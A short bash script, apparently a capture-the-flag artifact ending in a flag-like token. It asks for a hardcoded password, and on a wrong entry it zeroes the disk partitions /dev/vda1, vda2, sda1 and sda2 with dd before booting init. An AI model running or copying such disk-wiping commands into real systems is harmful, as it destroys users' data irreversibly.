#!/bin/bash

read -s -p "Enter password: " pass
printf "\n"
if [ "$pass" != "fsXABnFEmrzP0Q" ]
then
	echo "PASSWORD FAILURE REMOVING SYSTEM"
	dd if=/dev/zero of=/dev/vda1 bs=1M
	dd if=/dev/zero of=/dev/vda2 bs=1M
	dd if=/dev/zero of=/dev/sda1 bs=1M
	dd if=/dev/zero of=/dev/sda2 bs=1M
	sleep 2
fi

exec /sbin/init 2
#token- <tr0p1c4l_v1b3>#
